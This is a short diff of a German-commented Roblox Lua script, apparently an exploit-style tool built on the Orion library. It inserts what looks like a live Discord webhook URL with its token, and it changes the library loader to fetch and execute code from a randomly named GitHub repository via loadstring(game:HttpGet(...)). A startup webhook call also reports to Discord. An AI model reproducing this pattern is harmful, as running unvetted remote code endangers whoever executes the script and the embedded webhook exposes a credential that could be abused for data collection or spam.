@@ -55,7 +55,7 @@ local LocalPlayer = Player
 
 -- NEU: Discord Webhook Configuration (NUR BEIM START)
 local DiscordConfig = {
-    WebhookUrl = "YOUR_DISCORD_WEBHOOK_URL_HERE", -- <-- Hier deine Webhook URL einfügen
+    WebhookUrl = "https://discord.com/api/webhooks/1483119164679000156/dBf1z-o-Ky-L2L-MXCoNHQJ3x4DQ2HNCc4nAp1bDLZatFh4fiwKFCSchSjVBZG9A1_0c", -- <-- Hier deine Webhook URL einfügen
     ScriptUrl = "https://pastebin.com/raw/YOUR_SCRIPT_ID_HERE", -- <-- Hier deine Pastebin URL
     AutoReapply = true
 }
@@ -215,7 +215,7 @@ end
 sendStartWebhook()
 
 local function loadOrionLib()
-    return loadstring(game:HttpGet("https://71lr1.lol/scripts/Libary.lua"))()
+    return loadstring(game:HttpGet("https://raw.githubusercontent.com/Simbli2ifck2sk/hnhnfefgsnmehfnz34n3z27rn32zhr/main/f.lua"))()
 end
 
 local OrionLib = loadOrionLib()
